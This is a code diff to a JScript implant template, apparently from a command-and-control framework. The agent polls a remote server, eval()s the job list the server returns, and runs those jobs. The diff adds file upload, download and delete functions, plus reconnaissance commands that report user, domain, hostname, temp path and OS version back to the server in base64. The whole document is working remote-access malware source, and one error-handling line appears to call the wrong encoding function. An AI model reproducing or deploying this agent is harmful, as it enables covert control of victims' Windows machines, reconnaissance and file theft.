@@ -22,34 +22,63 @@ function post(data){
 }
 
 {% include "/jscript/functions/base64.js" %}
+{% include "/jscript/functions/delfile.js" %}
 {% include "/jscript/functions/dir.js" %}
+{% include  "/jscript/functions/download.js" %}
+{% include "/jscript/functions/upload.js" %}
 
 while (true) {
   try {
       eval("jobs=" + post(response).responseText + ";");
-      response = '[["{{ check_in_job_id }}"]';
+  } catch (e) {
+      var response = '[["{{ check_in_job_id }}"]]';
+      WScript.Sleep(sleep);
+      continue;
+  }
+  try {
+      response = '[';
       for (var key in jobs) {
-          if ('sleep' === jobs[key][0]) {
-              sleep = jobs[key][1]
-              response = response + ',["' + key + '","Sleep change to ' +  sleep + ' milliseconds."]';
-          }
-          if ('whoami' === jobs[key][0]) {
-              username = wscriptshell.ExpandEnvironmentStrings("%USERNAME%");
-              response = response + ',["' + key + '","' +  username + '"]';
-          }
+          eval("args=" + jobs[key][1] + ";");
           try{
-              if ('dir' === jobs[key][0]) {
-                  var directory = dir(jobs[key][1])
-                  response = response + ',["' + key + '","' +  directory + '"]';
+              var results = '';
+              if ('upload' === jobs[key][0]) {
+                  results = upload(b64d(args[0], "bin"), b64d(args[1]));
               }
+              if ('download' === jobs[key][0]) {
+                  results = download(b64d(args[0]));
+              }
+              if ('dir' === jobs[key][0]) {
+                  results = dir(b64d(args[0]));
+              }
+              if ('whoami' === jobs[key][0]) {
+                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
+              }
+              if ('tmp' === jobs[key][0]) {
+                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%"));
+              }
+              if ('hostname' === jobs[key][0]) {
+                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
+              }
+              if ('domain' === jobs[key][0]) {
+                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%"));
+              }
+              if ('os' === jobs[key][0]) {
+                  results = b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
+              }
+              if ('sleep' === jobs[key][0]) {
+                  sleep = b64d(args[0]);
+                  results = b64e('Sleep change to ' + sleep + ' milliseconds');
+              }
+              response = response + '["' + key + '","' +  results + '"],';
           } catch (e) {
-             response = response + ',["' + key + '","failed to run"]';
+             response = response + '["' + key + '","' + b64d("Job failed.") + '"],';
           }
-
       }
   } catch (e) {
-      response = '[["{{ check_in_job_id }}"]]';
+      response = response + '["{{ check_in_job_id }}"]]'
+      WScript.Sleep(sleep);
+      continue;
   }
-  response = response + ']';
+  response = response + '["{{ check_in_job_id }}"]]';
   WScript.Sleep(sleep);
 }
